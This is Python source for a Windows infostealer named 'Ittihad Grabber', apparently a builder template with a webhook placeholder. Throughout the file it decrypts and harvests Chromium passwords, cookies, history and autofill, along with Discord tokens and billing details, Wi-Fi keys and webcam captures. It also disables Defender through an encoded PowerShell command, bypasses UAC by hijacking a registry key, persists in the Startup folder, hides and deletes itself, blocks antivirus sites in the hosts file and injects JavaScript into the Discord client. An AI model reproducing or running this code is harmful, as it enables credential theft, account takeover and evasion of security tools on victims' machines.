import base64
import os
import subprocess
import sys
import json
import pyaes
import random
import shutil
import sqlite3
import re
import traceback
import time
import ctypes
import logging
import zlib
from threading import Thread
from ctypes import wintypes
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()

class Settings:
    C2 = (0, "@@WEBHOOK@@")
    Mutex = base64.b64decode('aXpHNERTVlBwYzVqeHdJMA==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('YmxhbmsxMjM=').decode()
    HideConsole = bool('true')
    Debug = bool('')
    RunBoundOnStartup = bool('')
    CaptureWebcam = bool('true')
    CapturePasswords = bool('true')
    CaptureCookies = bool('true')
    CaptureAutofills = bool('true')
    CaptureHistory = bool('true')
    CaptureDiscordTokens = bool('true')
    CaptureGames = bool('true')
    CaptureWifiPasswords = bool('true')
    CaptureSystemInfo = bool('true')
    CaptureScreenshot = bool('true')
    CaptureTelegram = bool('true')
    CaptureCommonFiles = bool('true')
    CaptureWallets = bool('true')
    FakeError = (bool(''), ('', '', '0'))
    BlockAvSites = bool('')
    DiscordInjection = bool('')

if not hasattr(sys, '_MEIPASS'):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))

try:
    ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
except Exception:
    pass

logging.basicConfig(format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')

for _, logger in logging.root.manager.loggerDict.items():
    logger.disabled = True

Logger = logging.getLogger('Ittihad Grabber')
Logger.setLevel(logging.INFO)
if not Settings.Debug:
    Logger.disabled = True

class Errors:
    errors: list[str] = []

    @staticmethod
    def Catch(func):

        def newFunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                if not isinstance(e, UnicodeEncodeError):
                    trb = traceback.format_exc()
                    Errors.errors.append(trb)
                    if Utility.GetSelf()[1]:
                        Logger.error(trb)
        return newFunc

class Tasks:
    threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None:
        Tasks.threads.append(task)

    @staticmethod
    def WaitForAll() -> None:
        for thread in Tasks.threads:
            thread.join()

class Syscalls:

    @staticmethod
    def CaptureWebcam(index: int, filePath: str) -> bool:
        avicap32 = ctypes.windll.avicap32
        WS_CHILD = 1073741824
        WM_CAP_DRIVER_CONNECT = 1024 + 10
        WM_CAP_DRIVER_DISCONNECT = 1026
        WM_CAP_FILE_SAVEDIB = 1024 + 100 + 25
        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('Ittihad'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
        result = False
        if hcam:
            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
                    result = True
                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            ctypes.windll.user32.DestroyWindow(hcam)
        return result

    @staticmethod
    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183

    @staticmethod
    def ReleaseMutex(mutex: str) -> None:
        try:
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.OpenMutexA(0x001F0001, False, mutex)
            if handle:
                kernel32.ReleaseMutex(handle)
                kernel32.CloseHandle(handle)
        except Exception:
            pass

    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str=None) -> bytes:

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None
        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode('utf-16')
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)
        raise ValueError('Invalid encrypted_data provided!')

    @staticmethod
    def HideConsole() -> None:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    @staticmethod
    def IsVCRedistInstalled() -> bool:
        try:
            paths = [
                os.path.join(os.getenv('SystemRoot', 'C:\\Windows'), 'System32', 'vcruntime140.dll'),
                os.path.join(os.getenv('SystemRoot', 'C:\\Windows'), 'System32', 'msvcp140.dll'),
            ]
            return all(os.path.isfile(p) for p in paths)
        except Exception:
            return True

    @staticmethod
    def InstallVCRedist() -> bool:
        try:
            url = 'https://aka.ms/vs/17/release/vc_redist.x64.exe'
            installer = os.path.join(os.getenv('temp'), 'vc_redist.x64.exe')
            http = PoolManager(cert_reqs='CERT_NONE', timeout=60.0)
            r = http.request('GET', url)
            if r.status != 200:
                return False
            with open(installer, 'wb') as f:
                f.write(r.data)
            subprocess.run([installer, '/install', '/quiet', '/norestart'], shell=True, capture_output=True, timeout=300)
            try:
                os.remove(installer)
            except Exception:
                pass
            return True
        except Exception:
            return False

    @staticmethod
    def IsAdminSafe() -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() == 1
        except Exception:
            return False

class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def TaskKill(*tasks: str) -> None:
        tasks = list(map(lambda x: x.lower(), tasks))
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
        for i in out:
            i = i.split('\r\n')[:2]
            try:
                name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
                name = name[:-4] if name.endswith('.exe') else name
                if name.lower() in tasks:
                    subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
            except Exception:
                pass

    @staticmethod
    def UACPrompt(path: str) -> bool:
        try:
            return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42
        except Exception:
            return False

    @staticmethod
    def DisableDefender() -> None:
        try:
            command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
            subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception:
            pass

    @staticmethod
    def ExcludeFromDefender(path: str=None) -> None:
        try:
            if path is None:
                path = Utility.GetSelf()[0]
            subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception:
            pass

    @staticmethod
    def GetRandomString(length: int=5, invisible: bool=False):
        if invisible:
            return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
        else:
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

    @staticmethod
    def GetWifiPasswords() -> dict:
        profiles = list()
        passwords = dict()
        try:
            for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'All User Profile' in line:
                    name = line[line.find(':') + 1:].strip()
                    profiles.append(name)
            for profile in profiles:
                found = False
                for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                    if 'Key Content' in line:
                        passwords[profile] = line[line.find(':') + 1:].strip()
                        found = True
                        break
                if not found:
                    passwords[profile] = '(None)'
        except Exception:
            pass
        return passwords

    @staticmethod
    def GetLnkTarget(path_to_lnk: str) -> str | None:
        target = None
        if os.path.isfile(path_to_lnk):
            try:
                output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace('\\', '\\\\'), shell=True, capture_output=True).stdout.decode()
                if output:
                    for line in output.splitlines():
                        if line.startswith('Target='):
                            temp = line.lstrip('Target=').strip()
                            if os.path.exists(temp):
                                target = temp
                                break
            except Exception:
                pass
        return target

    @staticmethod
    def GetLnkFromStartMenu(app: str) -> list[str]:
        shortcutPaths = []
        try:
            startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'), os.path.join('C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
            for startMenuPath in startMenuPaths:
                for root, _, files in os.walk(startMenuPath):
                    for file in files:
                        if file.lower() == '%s.lnk' % app.lower():
                            shortcutPaths.append(os.path.join(root, file))
        except Exception:
            pass
        return shortcutPaths

    @staticmethod
    def IsAdmin() -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() == 1
        except Exception:
            return False

    @staticmethod
    def UACbypass(method: int=1) -> bool:
        if not Utility.GetSelf()[1]:
            return False
        try:
            execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
            match method:
                case 1:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('computerdefaults --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case 2:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('fodhelper --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case _:
                    return False
            return True
        except Exception:
            return False

    @staticmethod
    def IsInStartup() -> bool:
        path = os.path.dirname(Utility.GetSelf()[0])
        return os.path.basename(path).lower() == 'startup'

    @staticmethod
    def PutInStartup() -> str:
        try:
            STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
            file, isExecutable = Utility.GetSelf()
            if isExecutable:
                out = os.path.join(STARTUPDIR, '{}.scr'.format(Utility.GetRandomString(invisible=True)))
                os.makedirs(STARTUPDIR, exist_ok=True)
                shutil.copy(file, out)
                return out
        except Exception:
            return None

    @staticmethod
    def IsConnectedToInternet() -> bool:
        http = PoolManager(cert_reqs='CERT_NONE', timeout=5.0)
        try:
            return http.request('GET', 'https://gstatic.com/generate_204').status == 204
        except Exception:
            try:
                return http.request('GET', 'http://ip-api.com/line/?fields=status').data.decode(errors='ignore').strip() == 'success'
            except Exception:
                return False

    @staticmethod
    def DeleteSelf():
        try:
            path, isExecutable = Utility.GetSelf()
            if isExecutable:
                subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
                os._exit(0)
            else:
                os.remove(path)
        except Exception:
            os._exit(0)

    @staticmethod
    def HideSelf() -> None:
        try:
            path, _ = Utility.GetSelf()
            subprocess.Popen('attrib +h +s "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception:
            pass

    @staticmethod
    def BlockSites() -> None:
        try:
            if Utility.IsAdmin():
                call = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell=True, capture_output=True)
                if call.returncode != 0:
                    hostdirpath = os.path.join('System32', 'drivers', 'etc')
                else:
                    hostdirpath = os.sep.join(call.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
                hostfilepath = os.path.join(os.getenv('systemroot'), hostdirpath, 'hosts')
                if not os.path.isfile(hostfilepath):
                    return
                with open(hostfilepath) as file:
                    data = file.readlines()
                BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
                newdata = []
                for i in data:
                    if any([x in i for x in BANNED_SITES]):
                        continue
                    else:
                        newdata.append(i)
                for i in BANNED_SITES:
                    newdata.append('\t0.0.0.0 {}'.format(i))
                    newdata.append('\t0.0.0.0 www.{}'.format(i))
                newdata = '\n'.join(newdata).replace('\n\n', '\n')
                subprocess.run('attrib -r {}'.format(hostfilepath), shell=True, capture_output=True)
                with open(hostfilepath, 'w') as file:
                    file.write(newdata)
                subprocess.run('attrib +r {}'.format(hostfilepath), shell=True, capture_output=True)
        except Exception:
            pass

class Browsers:

    class Chromium:
        BrowserPath: str = None
        EncryptionKey: bytes = None

        def __init__(self, browserPath: str) -> None:
            if not os.path.isdir(browserPath):
                raise NotADirectoryError('Browser path not found!')
            self.BrowserPath = browserPath

        def GetEncryptionKey(self) -> bytes | None:
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            else:
                try:
                    localStatePath = os.path.join(self.BrowserPath, 'Local State')
                    if os.path.isfile(localStatePath):
                        with open(localStatePath, encoding='utf-8', errors='ignore') as file:
                            jsonContent: dict = json.load(file)
                        encryptedKey: str = jsonContent['os_crypt']['encrypted_key']
                        encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
                        self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                        return self.EncryptionKey
                    else:
                        return None
                except Exception:
                    return None

        def Decrypt(self, buffer: bytes, key: bytes) -> str:
            try:
                version = buffer.decode(errors='ignore')
                if version.startswith(('v10', 'v11')):
                    iv = buffer[3:15]
                    cipherText = buffer[15:]
                    return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors='ignore')
                else:
                    return str(Syscalls.CryptUnprotectData(buffer))
            except Exception:
                return ''

        def GetPasswords(self) -> list[tuple[str, str, str]]:
            encryptionKey = self.GetEncryptionKey()
            passwords = list()
            if encryptionKey is None:
                return passwords
            loginFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'login data':
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)
            for path in loginFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                try:
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cursor = db.cursor()
                    results = cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
                    for url, username, password in results:
                        password = self.Decrypt(password, encryptionKey)
                        if url and username and password:
                            passwords.append((url, username, password))
                    cursor.close()
                    db.close()
                except Exception:
                    pass
                try:
                    os.remove(tempfile)
                except Exception:
                    pass
            return passwords

        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
            encryptionKey = self.GetEncryptionKey()
            cookies = list()
            if encryptionKey is None:
                return cookies
            cookiesFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'cookies':
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)
            for path in cookiesFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                try:
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cursor = db.cursor()
                    results = cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
                    for host, name, path, cookie, expiry in results:
                        cookie = self.Decrypt(cookie, encryptionKey)
                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))
                    cursor.close()
                    db.close()
                except Exception:
                    pass
                try:
                    os.remove(tempfile)
                except Exception:
                    pass
            return cookies

        def GetHistory(self) -> list[tuple[str, str, int]]:
            history = list()
            historyFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        filepath = os.path.join(root, file)
                        historyFilePaths.append(filepath)
            for path in historyFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                try:
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cursor = db.cursor()
                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                    for url, title, vc, lvt in results:
                        if url and title and (vc is not None) and (lvt is not None):
                            history.append((url, title, vc, lvt))
                    cursor.close()
                    db.close()
                except Exception:
                    pass
                try:
                    os.remove(tempfile)
                except Exception:
                    pass
            history.sort(key=lambda x: x[3], reverse=True)
            return list([(x[0], x[1], x[2]) for x in history])

        def GetAutofills(self) -> list[str]:
            autofills = list()
            autofillsFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'web data':
                        filepath = os.path.join(root, file)
                        autofillsFilePaths.append(filepath)
            for path in autofillsFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                try:
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cursor = db.cursor()
                    results: list[str] = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]
                    for data in results:
                        data = data.strip()
                        if data and (not data in autofills):
                            autofills.append(data)
                    cursor.close()
                    db.close()
                except Exception:
                    pass
                try:
                    os.remove(tempfile)
                except Exception:
                    pass
            return autofills

class Discord:
    httpClient = PoolManager(cert_reqs='CERT_NONE')
    ROAMING = os.getenv('appdata')
    LOCALAPPDATA = os.getenv('localappdata')
    REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
    REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'

    @staticmethod
    def GetHeaders(token: str=None) -> dict:
        headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'}
        if token:
            headers['authorization'] = token
        return headers

    @staticmethod
    def GetTokens() -> list[dict]:
        results: list[dict] = list()
        tokens: list[str] = list()
        threads: list[Thread] = list()
        paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'), 'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'), 'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'), 'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'), 'Sputnik': os.path.join(Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'), 'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'), 'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'), 'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'), 'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'), 'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data')}
        for name, path in paths.items():
            if os.path.isdir(path):
                if name == 'FireFox':
                    t = Thread(target=lambda: tokens.extend(Discord.FireFoxSteal(path) or list()))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target=lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
                    t.start()
                    threads.append(t)
                    t = Thread(target=lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
                    t.start()
                    threads.append(t)
        for thread in threads:
            thread.join()
        tokens = [*set(tokens)]
        for token in tokens:
            try:
                r: HTTPResponse = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
                if r.status == 200:
                    r = r.data.decode(errors='ignore')
                    r = json.loads(r)
                    user = r['username'] + '#' + str(r['discriminator'])
                    id = r['id']
                    email = r['email'].strip() if r['email'] else '(No Email)'
                    phone = r['phone'] if r['phone'] else '(No Phone Number)'
                    verified = r['verified']
                    mfa = r['mfa_enabled']
                    nitro_type = r.get('premium_type', 0)
                    nitro_infos = {0: 'No Nitro', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                    nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                    billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors='ignore'))
                    if len(billing) == 0:
                        billing = '(No Payment Method)'
                    else:
                        methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                        for m in billing:
                            if not isinstance(m, dict):
                                continue
                            method_type = m.get('type', 0)
                            match method_type:
                                case 1:
                                    methods['Card'] += 1
                                case 2:
                                    methods['Paypal'] += 1
                                case _:
                                    methods['Unknown'] += 1
                        billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                    gifts = list()
                    r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode(errors='ignore')
                    if 'code' in r:
                        r = json.loads(r)
                        for i in r:
                            if isinstance(i, dict):
                                code = i.get('code')
                                if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                    continue
                                title = i['promotion'].get('outbound_title')
                                if code and title:
                                    gifts.append(f'{title}: {code}')
                    if len(gifts) == 0:
                        gifts = 'Gift Codes: (NONE)'
                    else:
                        gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                    results.append({'USERNAME': user, 'USERID': id, 'MFA': mfa, 'EMAIL': email, 'PHONE': phone, 'VERIFIED': verified, 'NITRO': nitro_data, 'BILLING': billing, 'TOKEN': token, 'GIFTS': gifts})
            except Exception:
                pass
        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]:
        encryptedTokens = list()
        tokens = list()
        key: str = None
        levelDbPaths: list[str] = list()
        try:
            localStatePath = os.path.join(path, 'Local State')
            for root, dirs, _ in os.walk(path):
                for dir in dirs:
                    if dir == 'leveldb':
                        levelDbPaths.append(os.path.join(root, dir))
            if os.path.isfile(localStatePath) and levelDbPaths:
                with open(localStatePath, errors='ignore') as file:
                    jsonContent: dict = json.load(file)
                key = jsonContent['os_crypt']['encrypted_key']
                key = base64.b64decode(key)[5:]
                for levelDbPath in levelDbPaths:
                    for file in os.listdir(levelDbPath):
                        if file.endswith(('.log', '.ldb')):
                            filepath = os.path.join(levelDbPath, file)
                            with open(filepath, errors='ignore') as file:
                                lines = file.readlines()
                            for line in lines:
                                if line.strip():
                                    matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                    for match in matches:
                                        match = match.rstrip('\\')
                                        if not match in encryptedTokens:
                                            match = base64.b64decode(match.split('dQw4w9WgXcQ:')[1].encode())
                                            encryptedTokens.append(match)
            for token in encryptedTokens:
                try:
                    token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors='ignore')
                    if token:
                        tokens.append(token)
                except Exception:
                    pass
        except Exception:
            pass
        return tokens

    @staticmethod
    def SimpleSteal(path: str) -> list[str]:
        tokens = list()
        levelDbPaths = list()
        try:
            for root, dirs, _ in os.walk(path):
                for dir in dirs:
                    if dir == 'leveldb':
                        levelDbPaths.append(os.path.join(root, dir))
            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith(('.log', '.ldb')):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors='ignore') as file:
                            lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX, line.strip())
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in tokens:
                                        tokens.append(match)
        except Exception:
            pass
        return tokens

    @staticmethod
    def FireFoxSteal(path: str) -> list[str]:
        tokens = list()
        try:
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower().endswith('.sqlite'):
                        filepath = os.path.join(root, file)
                        with open(filepath, errors='ignore') as file:
                            lines = file.readlines()
                            for line in lines:
                                if line.strip():
                                    matches: list[str] = re.findall(Discord.REGEX, line)
                                    for match in matches:
                                        match = match.rstrip('\\')
                                        if not match in tokens:
                                            tokens.append(match)
        except Exception:
            pass
        return tokens

    @staticmethod
    def InjectJs() -> str | None:
        check = False
        try:
            code = base64.b64decode(b'%injectionbase64encoded%').decode(errors='ignore').replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors='ignore')))
        except Exception:
            return None
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            try:
                                with open(filepath, 'w', encoding='utf-8') as file:
                                    file.write(code)
                                check = True
                            except Exception:
                                pass
            if check:
                check = False
                yield path

class ittihadGrabber:
    Separator: str = None
    TempFolder: str = None
    ArchivePath: str = None
    Cookies: list = []
    PasswordsCount: int = 0
    HistoryCount: int = 0
    AutofillCount: int = 0
    RobloxCookiesCount: int = 0
    DiscordTokensCount: int = 0
    WifiPasswordsCount: int = 0
    MinecraftSessions: int = 0
    WebcamPicturesCount: int = 0
    TelegramSessionsCount: int = 0
    CommonFilesCount: int = 0
    WalletsCount: int = 0
    ScreenshotTaken: bool = False
    SystemInfoStolen: bool = False
    SteamStolen: bool = False
